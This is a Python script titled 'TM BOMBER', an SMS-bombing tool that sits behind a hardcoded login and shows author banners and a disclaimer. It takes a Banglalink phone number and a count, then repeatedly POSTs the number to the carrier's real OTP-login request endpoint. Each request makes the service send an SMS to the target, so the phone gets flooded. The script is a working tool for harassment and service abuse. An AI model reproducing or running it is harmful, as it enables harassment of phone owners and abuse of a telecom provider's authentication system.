import requests
import os
os.system("clear")

red="\033[0;31m"          # Red
yellow="\033[0;33m"       # Yellow
green="\033[0;32m"        # Green
color_off="\033[0m"       # Text Reset
bblack="\033[1;30m"       # Black
bred="\033[1;31m"         # Red
ured="\033[4;31m"         # Red


blue= '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan  = "\033[96m"
end = '\033[0m'
purple="\033[0;35m"


print(green+"""
  _______ __  __   ____   ____  __  __ ____  ______ _____  
 |__   __|  \/  | |  _ \ / __ \|  \/  |  _ \|  ____|  __ \ 
    | |  | \  / | | |_) | |  | | \  / | |_) | |__  | |__) |
    | |  | |\/| | |  _ <| |  | | |\/| |  _ <|  __| |  _  / 
    | |  | |  | | | |_) | |__| | |  | | |_) | |____| | \ \ 
    |_|  |_|  |_| |____/ \____/|_|  |_|____/|______|_|  \_\
            """)
               


print (yellow+"\t\t𝐂𝐫𝐞𝐚𝐭𝐞𝐝 𝐁𝐲: 𝐌𝐃 𝐓𝐀𝐒𝐑𝐈𝐅 𝐇𝐎𝐒𝐒𝐄𝐍")

print ("\t\tYoutube.com/tasrifmultimedia")

print ("\t\tFb.com/tasrif.hossen.shuvo")

print ("\t\tGithub.com/ShTasrif")

print ('************************************************************')
print (bred+'    Note: I wont be responsible fo any illigal activites.')
print(color_off)
print (yellow+'************************************************************')

print(color_off)

print (red+"\t\t       You Must Login")

n=2
while n==2:
  a=str(input(cyan+"\n\n\t\t[>] Username : "+green))
  b=str(input(cyan+"\n\n\t\t[>] Password : "+green))
  if a=="TASRIF" and b=="MULTIMEDIA":
   print(green+"\n\n\t\t[ √ ] Request Accepted")
   n=3
  else:
   
   print(red+"\n\n\t\t[ × ] Incorrect Password/Username!\n\t\tPlease Try Again")
   n=2

import os
os.system("clear")

print(green+"""
  _______ __  __   ____   ____  __  __ ____  ______ _____  
 |__   __|  \/  | |  _ \ / __ \|  \/  |  _ \|  ____|  __ \ 
    | |  | \  / | | |_) | |  | | \  / | |_) | |__  | |__) |
    | |  | |\/| | |  _ <| |  | | |\/| |  _ <|  __| |  _  / 
    | |  | |  | | | |_) | |__| | |  | | |_) | |____| | \ \ 
    |_|  |_|  |_| |____/ \____/|_|  |_|____/|______|_|  \_\
            """)
               
print ('	')

print (yellow+"\t\t𝐂𝐫𝐞𝐚𝐭𝐞𝐝 𝐁𝐲: 𝐌𝐃 𝐓𝐀𝐒𝐑𝐈𝐅 𝐇𝐎𝐒𝐒𝐄𝐍")

print ("\t\tYoutube.com/tasrifmultimedia")

print ("\t\tFb.com/tasrif.hossen.shuvo")

print ("\t\tGithub.com/ShTasrif")

print ('***********************************************************')
print (bred+'    Note: I wont be responsible fo any illigal activites.')
print(color_off)
print (yellow+'***********************************************************')

print(color_off)


#POST

apt="https://assetliteapi.banglalink.net/api/v1/user/otp-login/request"

number=str(input(" ➢Enter BL Number: "))
amount=int(input(" ➢Enter The Amount:  ")) 

know={'mobile':number}

for i in range(amount):
    requests.post(apt,data=know)
    print(str(i+1)+".	➙SMS Sent ✅")
	
	